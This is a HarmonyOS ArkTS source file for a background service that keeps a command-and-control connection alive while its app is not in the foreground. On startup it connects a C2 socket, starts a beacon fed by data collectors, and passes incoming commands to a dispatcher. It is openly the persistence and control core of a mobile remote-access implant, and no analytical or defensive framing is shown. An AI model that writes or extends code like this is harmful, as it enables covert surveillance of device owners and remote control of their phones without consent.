import ServiceExtensionAbility from '@ohos.app.ability.ServiceExtensionAbility';
import Want from '@ohos.app.ability.Want';
import { C2Socket } from './C2Socket';
import { Beacon } from './Beacon';
import { DataCollectors } from './DataCollectors';
import { CommandDispatcher } from './CommandDispatcher';

/**
 * HarmonyOS background ServiceExtension.
 * Keeps the C2 connection alive when the app is not in the foreground.
 * Declared in module.json5 under extensionAbilities.
 */
export default class BixtxBackgroundService extends ServiceExtensionAbility {
  private socket     = new C2Socket();
  private collectors = new DataCollectors();
  private beacon:     Beacon | null = null;
  private dispatcher: CommandDispatcher | null = null;

  onCreate(_want: Want): void {
    this.dispatcher = new CommandDispatcher(this.socket, this.collectors);
    this.beacon     = new Beacon(this.socket, this.collectors);

    this.socket.onCommand = (type, payload) => {
      this.dispatcher?.dispatch(type, payload);
    };

    this.socket.connect();
    this.beacon.start();
  }

  onDestroy(): void {
    this.beacon?.stop();
    this.socket.disconnect();
  }
}
